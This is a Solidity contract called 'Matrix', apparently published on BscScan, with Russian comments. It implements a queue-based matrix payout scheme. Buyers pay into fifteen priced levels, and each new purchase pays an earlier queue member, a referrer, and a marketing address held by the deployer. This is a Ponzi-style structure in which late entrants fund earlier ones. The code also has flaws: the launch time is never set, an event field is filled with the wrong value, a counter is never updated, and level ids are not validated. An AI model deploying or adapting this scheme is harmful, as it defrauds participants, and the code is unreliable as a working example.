/**
 *Submitted for verification at BscScan.com on 2022-08-17
*/

// SPDX-License-Identifier: MIT 

pragma solidity ^0.8.16;

// ----------------------------------------
// --- Объявление структур
// ----------------------------------------

// --- Структура для информации о контракте
struct ContractInfo {
    uint256 launch_time;    // - Время запуска
    address owner_adr;      // - Адрес владельца
    address marketing_adr;  // - Адрес для комиссии
    uint256 ref_fee;        // - Реферальная комиссия
    bool paused;            // - Контракт приостановлен
}

// --- Структура для статистики контракта
struct ContractStat {
    uint256 total_users;    // - Всего пользователей
    uint256 total_tx;       // - Всего транзакций
    uint256 queue_size;     // - Размер всех очередей
    uint256 users_spent;    // - Потрачено пользователями
    uint256 users_payout;   // - Выплачено пользователям
    uint256 ref_payout;     // - Выплачено по реферальной программе
}

// --- Структура для информации о уровне
struct Level {
    uint256 price;                  // - Стоимость стола
    uint256 precent;                // - Процент выплаты
    uint256 users_spent;            // - Потрачено пользователями
    uint256 users_payout;           // - Выплачено пользователям
    uint256 ref_payout;             // - Выплачено по реферальной программе
    uint256 queue_stand_time;       // - Общее время в очереди
    uint256 queue_head;             // - Индекс первого в очереди
    uint256 queue_tail;             // - Индекс последнего в очереди
    mapping(uint => address) queue; // - Очередь
}

// --- Структура для информации о пользователе
struct User {
    uint256 reg_time;                   // - Время регистрации
    uint256 spent;                      // - Потрачено пользователем
    uint256 payout;                     // - Выплачено пользователю
    address referrer;                   // - Адрес пригласившего пользователя
    uint256 referrals;                  // - Количество приглашенных пользователей
    uint256 ref_buys;                   // - Количество покупок приглашенных пользователей
    uint256 ref_payout;                 // - Выплачено по реферальной программе
    mapping(uint8 => UserLevel) levels; // - Статистика по уровням
}

// --- Структура для информации о уровнях пользователя
struct UserLevel {
    uint256 rounds_reserve;     // - Количество оставшихся кругов
    uint256 rounds_ended;       // - Количество завершенных кругов
    uint256 buys;               // - Покупок уровня
    uint256 spent;              // - Потрачено на уровень
    uint256 payout;             // - Выплачено за круги
    uint256 queue_stand_time;   // - Общее время в очереди
    uint256 queue_entry_time;   // - Время попадания в очередь
    uint256 queue_place;        // - Место в очереди
    uint256 queue_size;         // - Размер очереди на момент занятия места
    bool in_queue;              // - Пользователь в очереди
}

contract Matrix {
    // ----------------------------------------
    // --- Инициализация контракта
    // ----------------------------------------

    // -- Объявляем структуры
    ContractInfo contract_info;
    ContractStat contract_stat;

    // -- Объявляем "массивы"
    mapping(address => User) users;
    mapping(uint8 => Level) levels;

    // -- Объявляем события
    event UserRegistration(uint256 time, address indexed user, address indexed referrer);          // - Регистрация пользователя
    event LevelBuy(uint256 time, uint8 indexed id, address indexed user, uint256 amount);          // - Покупка уровня
    event RoundPayout(uint256 time, uint8 indexed id, address indexed user, uint256 amount);       // - Выплата за уровень
    event RefPayout(uint256 time, address indexed user, address indexed referrer, uint256 amount); // - Реферальная выплата

    // -- Инициализируем контракт
    constructor() {
        // -- Инициализируем информацию о контракте
        contract_info.launch_time = 0;                      // - Дату запуска выставляем в 0, так как контракт еще не запушен
        contract_info.owner_adr = payable(msg.sender);      // - Адресом владельца выставляем адрес создающий контракт
        contract_info.marketing_adr = payable(msg.sender);  // - Адресом для комиссии выставляем адрес создающий контракт
        contract_info.ref_fee = 10;                         // - Указываем реферальную комиссию 10%
        contract_info.paused = true;                        // - Контракт изначально не запущен

        // -- Инициализируем статистику контракта
        contract_stat.total_users = 0;
        contract_stat.total_tx = 0;
        contract_stat.queue_size = 0;
        contract_stat.users_spent = 0;
        contract_stat.users_payout = 0;
        contract_stat.ref_payout = 0;

        // -- Инициализируем уровни
        _makeLevels();
    }

    // ----------------------------------------
    // --- Интерфейс контракта
    // ----------------------------------------
    
    // -- Запускаем контракт (только owner)
    function launch() external {
        // -- Проверяем что функцию вызывает владелец контракта
        require(msg.sender == contract_info.owner_adr, 'Transaction sender must be owner');

        // -- Запускаем контракт
        contract_info.launch_time = 0;
        contract_info.paused = false;
    }

    // -- Покупаем уровень (id уровня, адрес реферера)
    function buyLevel(uint8 id, address referrer) external payable {
        // -- Проверяем что контракт запущен
        require(!contract_info.paused, 'Contract must be launched');
        
        // -- Покупаем уровень
        _buyLevel(id, referrer);
    }
    
    // ----------------------------------------
    // --- Инициализация контракта
    // ----------------------------------------

    // -- Инициализируем уровни
    function _makeLevels() private {
        _addLevel(1, 0.10 ether, 65);
        _addLevel(2, 0.13 ether, 65);
        _addLevel(3, 0.16 ether, 65);
        _addLevel(4, 0.20 ether, 65);
        _addLevel(5, 0.26 ether, 65);
        _addLevel(6, 0.33 ether, 70);
        _addLevel(7, 0.46 ether, 70);
        _addLevel(8, 0.64 ether, 70);
        _addLevel(9, 0.89 ether, 70);
        _addLevel(10, 1.24 ether, 70);
        _addLevel(11, 1.73 ether, 75);
        _addLevel(12, 2.59 ether, 75);
        _addLevel(13, 3.88 ether, 75);
        _addLevel(14, 5.82 ether, 75);
        _addLevel(15, 8.73 ether, 75);
    }

    // -- Добавляем уровень (идентификатор, цена, процент за круг)
    function _addLevel(uint8 id, uint256 price, uint256 precent) private {
        // -- Получаем уровень
        Level storage level = levels[id];

        // -- Инициализируем уровень
        level.price = price;
        level.precent = precent;
        level.users_spent = 0;
        level.users_payout = 0;
        level.ref_payout = 0;
        level.queue_stand_time = 0;
        level.queue_head = 0;
        level.queue_tail = 0;
    }

    // ----------------------------------------
    // --- Регистрация пользователей
    // ----------------------------------------

    // -- Регистрируем пользователя (адрес реферера)
    function _registerUser(address referrer) private {
        // -- Если пользователь уже зарегестрирован возвращаем revert
        require(!_isUserRegister(msg.sender), 'User is already registered');

        // -- Если адрес отправителя транзации совпадает с адресом реферера или равен null адресу
        if(msg.sender == referrer || referrer == address(0)){
            // -- Если адрес отправителя транзации совпадает с адресом для комиссионных
            // -- То в качестве реферера выставляется null адрес
            // -- Иначе в качестве реферера выставляется адрес для комиссионных
            if(msg.sender == contract_info.marketing_adr){
                referrer = address(0);
            } else {
                referrer = contract_info.marketing_adr;
            }
        }

        // -- Если адрес реферера не зарегестрирован
        if(!_isUserRegister(referrer)){
            // -- Если реферер совпадает с адресом на который перечисляются комиссионные
            // -- То добавляем в базу адрес для комиссионных с реферером в качестве null адреса
            // -- Иначе добавляем в базу реферера с реферером в качестве адреса для комиссионных
            if(referrer == contract_info.marketing_adr){
                _addUser(referrer, address(0));
            } else {
                // -- Только если отправитель транзакции не адрес для комиссионных
                if(msg.sender != contract_info.marketing_adr){
                    _addUser(referrer, contract_info.marketing_adr);
                }
            }
        }

        // -- Добавляем пользователя в базу
        _addUser(msg.sender, referrer);
    }
    
    // -- Добавляем пользователя в базу (адрес пользователя, адрес реферера)
    function _addUser(address user_adr, address referrer_adr) private {
        // -- Получаем текущее время (время блока)
        uint256 reg_time = block.timestamp;

        // -- Получаем пользователя
        User storage user = users[user_adr];

        // -- Инициализируем пользователя
        user.reg_time = reg_time;
        user.spent = 0;
        user.payout = 0;
        user.referrer = referrer_adr;
        user.referrals = 0;
        user.ref_buys = 0;
        user.ref_payout = 0;

        // -- Если адрес реферера не равен null адресу
        // -- Обновляем статистику реферера
        if(referrer_adr != address(0)){
            users[referrer_adr].referrals += 1;
        }

        // -- Обновляем статистику контракта
        contract_stat.total_users += 1;

        // -- Выпускаем событие о регистрации
        emit UserRegistration(reg_time, user_adr, referrer_adr);
    }

    // -- Проверяем зарегистрирован ли пользователь (адрес пользователя)
    function _isUserRegister(address user) private view returns (bool) {
        return users[user].reg_time != 0;   // - Пользователь существует, если время регистрации != 0
    }

    // ----------------------------------------
    // --- Покупка уровней
    // ----------------------------------------

    // -- Покупаем уровень (id уровня, адрес реферера)
    function _buyLevel(uint8 id, address referrer) private {
        // -- Получаем уровень
        Level storage level = levels[id];

        // -- Проверяем что достаточно денег для покупки
        require(msg.value >= level.price, "Not enough money to buy a level");

        // -- Получаем текущее время (время блока)
        uint256 time = block.timestamp;

        // -- Если покупатель не зарегестрирован
        // -- То регистрируем покупателя
        if(!_isUserRegister(msg.sender)){
            _registerUser(referrer);
        }

        // -- Получаем статистику по кругу для покупателя
        UserLevel storage buyer_level = users[msg.sender].levels[id];

        // -- Получаем реферера покупателя
        address user_referrer = users[msg.sender].referrer;

        // -- Обновляем статистику по кругу для покупателя
        buyer_level.rounds_reserve += 2;
        buyer_level.buys += 1;
        buyer_level.spent += level.price;

        // -- Если покупателя нет в очереди
        if(!buyer_level.in_queue){
            // -- Увеличиваем размер очереди на 1
            level.queue_tail += 1;
            // -- Добавляем покупателя в конец очереди
            level.queue[level.queue_tail] = msg.sender;
            // -- Устанавливаем для покупателя место в очереди
            buyer_level.queue_place = level.queue_tail;
            // -- Рассчитываем размер очереди для покупателя
            buyer_level.queue_size = buyer_level.queue_place - (level.queue_head + 1);
            // -- Покупатель теперь в очереди
            buyer_level.in_queue = true;
            // -- Устанавливаем время попадания в очередь
            buyer_level.queue_entry_time = time;
            // -- Уменьшаем количество оставшихся кругов для покупателя на 1
            buyer_level.rounds_reserve -= 1;
        }

        // -- Смещаем индекс начала очереди на 1
        level.queue_head += 1;

        // -- Получаем адрес первого в очереди
        address payout_adr = level.queue[level.queue_head];

        // -- Получаем статистику по кругу для первого в очереди
        UserLevel storage payout_level = users[payout_adr].levels[id];

        // -- Увеличиваем общее время в очереди
        payout_level.queue_stand_time += time - payout_level.queue_entry_time;
        level.queue_stand_time += time - payout_level.queue_entry_time;

        // -- Если у первого в очереди еще остались круги
        if(payout_level.rounds_reserve > 0){
            // -- Увеличиваем размер очереди на 1
            level.queue_tail += 1;
            // -- Добавляем первого в очереди в конец очереди
            level.queue[level.queue_tail] = payout_adr;
            // -- Устанавливаем для первого в очереди место в очереди
            payout_level.queue_place = level.queue_tail;
            // -- Рассчитываем размер очереди для первого в очереди
            payout_level.queue_size = payout_level.queue_place - (level.queue_head + 1);
            // -- Устанавливаем время попадания в очередь
            payout_level.queue_entry_time = time;
            // -- Уменьшаем количество оставшихся кругов для первого в очереди на 1
            payout_level.rounds_reserve -= 1;
        } else {
            // -- Первый в очереди выходит из очереди
            payout_level.in_queue = false;
            payout_level.queue_entry_time = 0;
            payout_level.queue_place = 0;
            payout_level.queue_size = 0; 
        }

        // -- Рассчитываем выплаты
        uint256 user_payout = (level.price*level.precent)/100;
        uint256 referrer_payout = (level.price*contract_info.ref_fee)/100;
        uint256 marketing_payout = msg.value - (user_payout + referrer_payout);

        // -- Производим выплаты
        _sendPayout(payable(payout_adr), user_payout);
        _sendPayout(payable(user_referrer), referrer_payout);
        _sendPayout(payable(contract_info.marketing_adr), marketing_payout);

        // -- Обновляем статистику контракта
        contract_stat.total_tx += 1;
        contract_stat.queue_size += 1;
        contract_stat.users_spent += level.price;
        contract_stat.users_payout += user_payout;
        contract_stat.ref_payout += referrer_payout;

        // -- Обновляем статистику уровня
        level.users_spent += level.price;
        level.users_payout += user_payout;
        level.ref_payout += referrer_payout;

        // -- Обновляем статистику первого в очереди по текущему уровню
        payout_level.payout += user_payout;

        // -- Обновляем статистику покупателя
        users[msg.sender].spent += level.price;

        // -- Обновляем статистику первого в очереди
        users[payout_adr].payout += user_payout;

        // -- Обновляем статистику реферера
        users[user_referrer].ref_buys += 1;
        users[user_referrer].ref_payout += referrer_payout;

        // -- Выпускаем событие о покупке уровня
        emit LevelBuy(time, id, msg.sender, level.price);

        // -- Выпускаем событие о выплате за круг
        emit RoundPayout(time, id, payout_adr, user_payout);

        // -- Выпускаем событие о реферальной выплате
        emit RefPayout(id, msg.sender, user_referrer, referrer_payout);
    }

    // ----------------------------------------
    // --- Выплаты
    // ----------------------------------------

    // -- Переводим amount монет на адрес to
    function _sendPayout(address payable to, uint256 amount) private {
        to.transfer(amount);
    }

    // ----------------------------------------
    // --- Вывод состояния контракта
    // ----------------------------------------

    // -- Информация о контракте
    function getContractInfo() public view returns(uint256, address, address, uint256, bool){
        return (
            contract_info.launch_time,
            contract_info.owner_adr,
            contract_info.marketing_adr,
            contract_info.ref_fee,
            contract_info.paused
        );
    }

    // -- Статистика контракта
    function getContractStat() public view returns(uint256, uint256, uint256, uint256, uint256, uint256){
        return (
            contract_stat.total_users,
            contract_stat.total_tx,
            contract_stat.queue_size,
            contract_stat.users_spent,
            contract_stat.users_payout,
            contract_stat.ref_payout
        );
    }

    // -- Статистика по уровням
    function getLevel(uint8 id) public view returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256){
        Level storage level = levels[id];

        return (
            level.price,
            level.precent,
            level.users_spent,
            level.users_payout,
            level.ref_payout,
            level.queue_stand_time,
            level.queue_head,
            level.queue_tail
        );
    }

    // -- Статистика пользователя
    function getUser(address adr) public view returns(uint256, uint256, uint256, address, uint256, uint256, uint256){
        User storage user = users[adr];

        return (
            user.reg_time,
            user.spent,
            user.payout,
            user.referrer,
            user.referrals,
            user.ref_buys,
            user.ref_payout
        );
    }

    // -- Статистика пользователя по уровню
    function getUserLevel(uint8 id, address adr) public view returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, bool){
        UserLevel storage user_level = users[adr].levels[id];

        return (
            user_level.rounds_reserve,
            user_level.rounds_ended,
            user_level.buys,
            user_level.spent,
            user_level.payout,
            user_level.queue_stand_time,
            user_level.queue_entry_time,
            user_level.queue_place,
            user_level.queue_size,
            user_level.in_queue
        );
    }
}